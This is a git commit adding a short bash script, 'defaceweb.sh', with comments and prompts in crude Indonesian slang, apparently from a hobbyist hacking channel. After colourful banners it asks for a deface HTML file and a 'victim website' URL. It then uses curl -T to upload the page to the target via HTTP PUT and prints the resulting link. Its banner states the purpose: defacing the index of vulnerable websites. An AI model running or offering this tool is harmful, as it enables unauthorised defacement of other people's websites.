383c836e12aeabdc57576481792d53d80726f9a1
FarelZeus <63641611+FarelZeus@users.noreply.github.com>
2020-04-20 18:15:10 +0700

    Add files via upload

---
+++ defaceweb.sh
@@ -0,0 +1,48 @@
+#MAU NYOLONG COK?
+
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+echo
+neofetch
+figlet '  ||| DEFACE-WEB |||' |lolcat
+echo
+echo "================================"
+date |lolcat
+echo "================================"
+echo
+echo $green"                 ∆∆=============================∆∆"
+echo $cyan"     		  Author : Tn.FarelZeus"
+echo $cyan"     		  Youtube : Tn FarelZeus"
+echo $green"                 ∆∆=============================∆∆"
+echo
+echo '''   ∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆''' |lolcat
+echo '''
+NB : TOOLS INI HANYA UNTUK TEBAS INDEX WEBSITE VULN ATAU LEMAH BUKAN UNTUK BIKIN SCRIPT
+'''
+echo '''   ∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆∆''' |lolcat
+echo
+echo 'Contoh Nya cok : deface.html'
+echo '----------------------------------------'
+read -p 'Masukin Sc defacenya : ' skrip
+echo
+echo 'Contoh Nya Cok : http://gobloktolol.com'
+echo '----------------------------------------'
+read -p 'Masukin Website Korban Cok :' korban
+echo
+echo 'TUNGGU LAGI DI PROSES COK...'
+sleep 2
+echo
+echo
+curl -T /storage/emulated/0/$skrip $korban
+echo 'NIH COK HASILNYA COPY AJA : '$korban/$skrip |lolcat
+echo '''
+TUH COK COPY AJA KLO BERHASIL ALHAMDULILLAH
+KLO GAK BERHASIL COBA LAGI
+MAKASIH DAH PAKE TOOLS GW GW YA COK
+'''
